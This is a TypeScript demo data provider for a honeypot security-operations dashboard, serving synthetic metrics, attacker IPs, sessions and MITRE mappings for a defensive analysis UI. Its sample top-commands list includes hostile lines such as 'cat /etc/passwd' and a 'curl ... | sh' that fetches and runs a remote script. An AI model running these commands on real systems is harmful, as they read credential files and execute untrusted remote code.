import type { DashboardData, DataProvider } from "@/services/provider";
import type { AnalysisStage, Annotation, HoneypotEvent, LogQuery, Paginated } from "@/types";
import * as demo from "./dataset";

const demoAnnotations: Annotation[] = [];

const delay = (ms: number) => new Promise((resolve) => setTimeout(resolve, ms));

/** Pacing of the demo stage playback, in milliseconds per stage. */
const DEMO_STAGE_MS = 380;

/** Mirrors ANALYSIS_STAGES — the pipeline the FastAPI backend is expected to run. */
const DEMO_STAGES: AnalysisStage[] = [
  "parsing_logs",
  "identifying_patterns",
  "classifying_behavior",
  "extracting_indicators",
  "mapping_mitre",
  "generating_intel",
  "generating_recommendations",
];

function timelineFor(range: string) {
  const buckets = range === "15m" ? 15 : range === "1h" ? 12 : range === "24h" ? 24 : 28;
  const stepLabel = (i: number) => {
    if (range === "15m") return `${i}m`;
    if (range === "1h") return `${i * 5}m`;
    if (range === "24h") return `${String(i).padStart(2, "0")}:00`;
    return `D-${28 - i}`;
  };
  return Array.from({ length: buckets }, (_, i) => {
    const wave = Math.sin((i / buckets) * Math.PI * 2) * 0.5 + 0.5;
    const events = Math.round(120 + wave * 640 + ((i * 37) % 90));
    return { t: stepLabel(i), events, highRisk: Math.round(events * (0.06 + (i % 5) * 0.015)) };
  });
}

const dashboard = (range: string): DashboardData => ({
  kpis: [
    {
      id: "events",
      label: "Total Events",
      value: 24831,
      trendPct: 12.4,
      trendDirection: "up",
      tone: "default",
    },
    {
      id: "active",
      label: "Active Sessions",
      value: 17,
      trendPct: 4.1,
      trendDirection: "up",
      tone: "info",
    },
    {
      id: "attackers",
      label: "Unique Attackers",
      value: 143,
      trendPct: 2.8,
      trendDirection: "up",
      tone: "default",
    },
    {
      id: "highrisk",
      label: "High-Risk Sessions",
      value: 28,
      trendPct: 9.6,
      trendDirection: "up",
      tone: "high",
    },
    {
      id: "techniques",
      label: "MITRE Techniques",
      value: 19,
      trendPct: 0,
      trendDirection: "flat",
      tone: "default",
    },
    {
      id: "malware",
      label: "Malware Samples",
      value: 37,
      trendPct: 6.2,
      trendDirection: "up",
      tone: "critical",
    },
    {
      id: "analyses",
      label: "AI Analyses",
      value: 1284,
      trendPct: 18.9,
      trendDirection: "up",
      tone: "ai",
    },
    {
      id: "alerts",
      label: "Critical Alerts",
      value: 6,
      trendPct: -14.3,
      trendDirection: "down",
      tone: "critical",
    },
  ],
  timeline: timelineFor(range),
  classifications: [
    { name: "Reconnaissance", value: 412 },
    { name: "Initial Access", value: 268 },
    { name: "Execution", value: 331 },
    { name: "Persistence", value: 96 },
    { name: "Privilege Escalation", value: 74 },
    { name: "Defense Evasion", value: 118 },
    { name: "Credential Access", value: 305 },
    { name: "Discovery", value: 388 },
    { name: "Command and Control", value: 142 },
    { name: "Exfiltration", value: 39 },
    { name: "Unknown", value: 61 },
  ],
  riskDistribution: [
    { level: "Critical", value: 6 },
    { level: "High", value: 28 },
    { level: "Medium", value: 74 },
    { level: "Low", value: 190 },
    { level: "Informational", value: 421 },
  ],
  topAttackers: [
    {
      ip: "185.207.104.42",
      country: "NL",
      events: 1284,
      sessions: 2,
      risk: "high",
      lastSeen: "14:32:10",
    },
    {
      ip: "45.155.205.233",
      country: "RU",
      events: 964,
      sessions: 5,
      risk: "critical",
      lastSeen: "14:02:03",
    },
    {
      ip: "20.114.77.9",
      country: "US",
      events: 742,
      sessions: 3,
      risk: "critical",
      lastSeen: "11:19:31",
    },
    {
      ip: "103.94.11.87",
      country: "IN",
      events: 611,
      sessions: 4,
      risk: "medium",
      lastSeen: "13:23:44",
    },
    {
      ip: "91.240.118.222",
      country: "UA",
      events: 508,
      sessions: 6,
      risk: "medium",
      lastSeen: "09:41:47",
    },
    {
      ip: "212.70.149.150",
      country: "BG",
      events: 287,
      sessions: 2,
      risk: "low",
      lastSeen: "10:12:38",
    },
  ],
  topCommands: [
    { command: "uname -a", count: 512, techniqueId: "T1082" },
    { command: "whoami", count: 486, techniqueId: "T1087" },
    { command: "cat /etc/passwd", count: 402, techniqueId: "T1087" },
    { command: "wget http://31.44.185.9/payload.sh", count: 271, techniqueId: "T1105" },
    { command: "curl -s http://31.44.185.9/b.sh | sh", count: 233, techniqueId: "T1059" },
    { command: "chmod +x payload.sh", count: 198, techniqueId: "T1222" },
    { command: "./payload.sh", count: 176, techniqueId: "T1059" },
    { command: "crontab -l", count: 94, techniqueId: "T1053" },
  ],
});

function matchesQuery(event: HoneypotEvent, query: LogQuery): boolean {
  const q = query.q?.trim().toLowerCase();
  if (q) {
    const haystack = [
      event.source.ip,
      event.destination.ip,
      event.process?.commandLine,
      event.user?.name,
      event.session.id,
      event.honeypot.name,
      event.mitre?.techniqueId,
      event.event.action,
    ]
      .filter(Boolean)
      .join(" ")
      .toLowerCase();
    if (!haystack.includes(q)) return false;
  }
  if (query.honeypotId && event.honeypot.id !== query.honeypotId) return false;
  if (query.sourceIp && event.source.ip !== query.sourceIp) return false;
  if (query.destinationIp && event.destination.ip !== query.destinationIp) return false;
  if (query.protocol && event.network.protocol !== query.protocol) return false;
  if (query.eventCategory && event.event.category !== query.eventCategory) return false;
  if (query.risk && event.risk.level !== query.risk) return false;
  if (query.techniqueId && event.mitre?.techniqueId !== query.techniqueId) return false;
  if (query.sessionId && event.session.id !== query.sessionId) return false;
  return true;
}

/**
 * DemoProvider — serves the isolated synthetic dataset so the SOC UI can be
 * demonstrated without FastAPI. It never pretends to be a backend response:
 * every consumer surface renders a DEMO DATA provenance badge.
 */
export const DemoProvider: DataProvider = {
  mode: "demo",

  async getSystemStatus() {
    await delay(120);
    return demo.systemStatus;
  },

  async getHoneypots() {
    await delay(220);
    return demo.honeypots;
  },

  async getNotables() {
    await delay(220);
    // Derived from the demo sessions' own model-rated risk, as the backend
    // derives its feed from stored analyses -- not a separate invented list.
    return demo.sessions
      .filter(
        (s) => s.analysisState === "completed" && (s.risk === "high" || s.risk === "critical"),
      )
      .map((s) => ({
        id: `high_risk_session:${s.id}`,
        kind: "high_risk_session" as const,
        provenance: "AI INFERENCE" as const,
        title: `${s.risk === "critical" ? "Critical" : "High"} risk: ${s.classificationChain.at(-1) ?? "analysed session"}`,
        detail: `Model-rated ${s.riskScore}/100 for session ${s.id}`,
        timestamp: s.startedAt,
        sessionId: s.id,
      }))
      .sort((a, b) => b.timestamp.localeCompare(a.timestamp));
  },

  // Annotations are typed by the viewer, so demo mode keeps them in memory for
  // this page -- there is nothing synthetic to pretend about.
  async getAnnotations(sessionId) {
    await delay(100);
    return demoAnnotations.filter((a) => a.sessionId === sessionId);
  },

  async addAnnotation(sessionId, kind, body) {
    await delay(100);
    const text = kind === "tag" ? body.trim().toLowerCase() : body.trim();
    const existing = demoAnnotations.find(
      (a) => a.sessionId === sessionId && a.kind === "tag" && kind === "tag" && a.body === text,
    );
    if (existing) return existing;
    const created = {
      id: `demo-${demoAnnotations.length + 1}`,
      sessionId,
      kind,
      body: text,
      author: "unauthenticated",
      authorLabel: null,
      createdAt: new Date().toISOString(),
    };
    demoAnnotations.push(created);
    return created;
  },

  async deleteAnnotation(sessionId, annotationId) {
    await delay(100);
    const index = demoAnnotations.findIndex(
      (a) => a.id === annotationId && a.sessionId === sessionId,
    );
    if (index >= 0) demoAnnotations.splice(index, 1);
  },

  async getSessionReplay() {
    await delay(150);
    // No recording exists for invented sessions; inventing one would be worse.
    return { status: "no_recording", frames: [], duration: 0, shared: false, truncated: false };
  },

  async getIdenticalSessions() {
    await delay(150);
    // The demo sessions are distinct by construction; claiming twins would be invented.
    return {
      fingerprint: null,
      twinCount: 0,
      analysed: [],
      complete: true,
      incompleteReason: null,
    };
  },

  async getCampaigns() {
    await delay(220);
    // No invented campaigns. A campaign is a claim that real sessions repeated
    // one script, and the demo sessions are distinct by construction.
    return {
      campaigns: [],
      sessionsConsidered: demo.sessions.length,
      complete: true,
      incompleteReason: null,
    };
  },

  async getSessions(params) {
    await delay(220);
    // The demo lists fit on one page; a later page is empty, not a repeat.
    if (params?.offset) return [];
    let items = demo.sessions;
    if (params?.risk) items = items.filter((s) => s.risk === params.risk);
    if (params?.honeypotId) items = items.filter((s) => s.honeypotId === params.honeypotId);
    if (params?.q) {
      const q = params.q.toLowerCase();
      items = items.filter(
        (s) =>
          s.id.toLowerCase().includes(q) ||
          s.attackerIp.includes(q) ||
          s.honeypotName.toLowerCase().includes(q) ||
          s.mitreTechniqueIds.some((t) => t.toLowerCase().includes(q)),
      );
    }
    return items;
  },

  async getSession(id) {
    await delay(180);
    const session = demo.sessions.find((s) => s.id === id);
    if (!session) throw new Error(`Session ${id} not found in demo dataset`);
    return session;
  },

  async getSessionTimeline(id) {
    await delay(200);
    return demo.timelineFor(id);
  },

  async getSessionEvents(id) {
    await delay(200);
    return demo.sessionEvents[id] ?? demo.allEvents.filter((e) => e.session.id === id);
  },

  async getEvent(eventId) {
    await delay(140);
    const event = demo.allEvents.find((e) => e.id === eventId);
    if (!event) throw new Error(`unknown demo event ${eventId}`);
    return event;
  },

  async getLogFacets() {
    await delay(120);
    // Counted from the same events queryLogs filters, so every option matches.
    const count = (values: (string | undefined)[]) => {
      const counts = new Map<string, number>();
      for (const v of values) if (v) counts.set(v, (counts.get(v) ?? 0) + 1);
      return [...counts]
        .map(([value, n]) => ({ value, count: n }))
        .sort((a, b) => b.count - a.count);
    };
    return {
      protocols: count(demo.allEvents.map((e) => e.network.protocol)),
      categories: count(demo.allEvents.map((e) => e.event.category)),
      techniques: count(demo.allEvents.map((e) => e.mitre?.techniqueId)),
      risks: count(demo.allEvents.map((e) => e.risk.level)),
    };
  },

  async queryLogs(query): Promise<Paginated<HoneypotEvent>> {
    await delay(260);
    const filtered = demo.allEvents.filter((event) => matchesQuery(event, query));
    const page = query.page ?? 1;
    const pageSize = query.pageSize ?? 25;
    return {
      items: filtered.slice((page - 1) * pageSize, page * pageSize),
      total: filtered.length,
      page,
      pageSize,
    };
  },

  async analyzeSession(sessionId) {
    // Long enough for the scripted stage playback below to actually run through;
    // a real backend run takes tens of seconds.
    await delay(DEMO_STAGE_MS * (DEMO_STAGES.length + 1));
    const analysis = demo.analysisHistory.find((a) => a.sessionId === sessionId);
    return {
      ...(analysis ?? demo.analysisFor8F42A1),
      sessionId,
      createdAt: new Date().toISOString(),
    };
  },

  async getAnalysis(id) {
    await delay(160);
    const analysis = demo.analysisHistory.find((a) => a.id === id);
    if (!analysis) throw new Error(`Analysis ${id} not found in demo dataset`);
    return analysis;
  },

  async getAnalysisHistory(params) {
    await delay(200);
    if (params?.offset) return [];
    return demo.analysisHistory;
  },

  /**
   * Demo-only pipeline playback.
   *
   * This is a scripted walk through the documented backend stages so the
   * investigation flow can be demonstrated without FastAPI. It is NOT a model
   * run and NOT a WebSocket — every surface that consumes it is labelled as
   * demo data. FastAPIProvider deliberately omits this method until the real
   * progress channel exists.
   */
  subscribeAnalysisProgress(_sessionId, onEvent) {
    const timers: ReturnType<typeof setTimeout>[] = [];
    const totals = { events: 184, commands: 37, techniques: 6, iocs: 9 };

    DEMO_STAGES.forEach((stage, index) => {
      timers.push(
        setTimeout(
          () => {
            const ratio = (index + 1) / DEMO_STAGES.length;
            onEvent({
              stageIndex: index,
              stage,
              metrics: {
                progressPct: Math.round(ratio * 100),
                eventsProcessed: Math.round(totals.events * ratio),
                commandsAnalyzed: Math.round(totals.commands * ratio),
                techniquesDetected: Math.round(totals.techniques * ratio),
                iocsExtracted: Math.round(totals.iocs * ratio),
              },
            });
          },
          DEMO_STAGE_MS * (index + 1),
        ),
      );
    });

    // Already listening -- these are local timers, not a socket, so there is
    // no handshake to wait out. The promise exists to match the interface,
    // which the FastAPI provider needs (see `subscribeAnalysisProgress` in
    // provider.ts).
    return Promise.resolve(() => {
      for (const timer of timers) clearTimeout(timer);
    });
  },

  async getMitreCoverage(params) {
    await delay(220);
    const techniques = demo.buildTechniques(params?.sessionId);
    return {
      techniques,
      observedCount: techniques.filter((t) => t.observed).length,
      totalCount: techniques.length,
    };
  },

  async getIndicators(params) {
    await delay(200);
    if (params?.offset) return [];
    let items = demo.indicators;
    if (params?.type) items = items.filter((i) => i.type === params.type);
    if (params?.q) {
      const q = params.q.toLowerCase();
      items = items.filter(
        (i) => i.value.toLowerCase().includes(q) || i.tags.some((t) => t.includes(q)),
      );
    }
    return items;
  },

  async getVirusTotalVerdict() {
    await delay(120);
    return {
      source: "VirusTotal",
      status: "not_configured" as const,
      detail: "VirusTotal lookups need the backend and a VirusTotal key.",
    };
  },

  async getAttackerReputation() {
    await delay(120);
    // No invented scores: a reputation is someone else's report, and demo mode has none.
    return {
      source: "AbuseIPDB",
      status: "not_configured" as const,
      detail: "Third-party reputation lookups need the backend and an AbuseIPDB key.",
    };
  },

  async getAttackerProfile(ip) {
    await delay(240);
    const profile = demo.attackerProfiles[ip];
    if (!profile) throw new Error(`No attacker profile for ${ip} in demo dataset`);
    return profile;
  },

  async getReports(params) {
    await delay(200);
    if (params?.offset) return [];
    return demo.reports;
  },

  async createReport(sessionId) {
    await delay(700);
    const base = demo.reports[0]!;
    return {
      ...base,
      id: `RPT-${Math.floor(Math.random() * 9000 + 1000)}`,
      sessionId,
      createdAt: new Date().toISOString(),
    };
  },

  async getDashboard(range) {
    await delay(260);
    return dashboard(range);
  },

  async listEvaluations(limit) {
    await delay(220);
    // The backend caps this at 100 and rejects more with a 422; the demo just
    // slices, because there is nothing here to reject.
    return limit === undefined
      ? demo.evaluationRunSummaries
      : demo.evaluationRunSummaries.slice(0, limit);
  },

  async getEvaluation(id) {
    await delay(200);
    const run = demo.evaluationRuns.find((r) => r.id === id);
    if (!run) throw new Error(`Evaluation run ${id} not found in demo dataset`);
    return run;
  },

  /**
   * Mirrors the 202: a run id and nothing else. The demo returns an EXISTING
   * run's id so the follow-up getEvaluation resolves — it does not fabricate a
   * run that was never measured.
   */
  async startEvaluation(_honeypotId) {
    await delay(400);
    return { runId: demo.evaluationRuns[0]!.id };
  },

  /**
   * Remediation for one run's findings.
   *
   * An unknown id throws rather than returning [], for the same reason
   * getEvaluation does: an empty list is a real answer meaning "this run has
   * no findings to fix", and handing it back for a run that does not exist
   * would report a missing run as a clean one.
   */
  async getEvaluationRemediation(runId) {
    await delay(180);
    const items = demo.evaluationRemediation[runId];
    if (!items) throw new Error(`Evaluation run ${runId} not found in demo dataset`);
    return items;
  },

  async compareEvaluations(base, head) {
    await delay(260);
    const from = demo.evaluationRuns.find((r) => r.id === base);
    const to = demo.evaluationRuns.find((r) => r.id === head);
    if (!from || !to)
      throw new Error(`Evaluation run ${from ? head : base} not found in demo dataset`);
    return demo.compareEvaluationRuns(from, to);
  },

  // subscribeEvaluationProgress is deliberately omitted: there is no real
  // stage source here, and inventing one would make a spinner imply knowledge
  // no backend sent. The optional method exists for exactly this case.
};
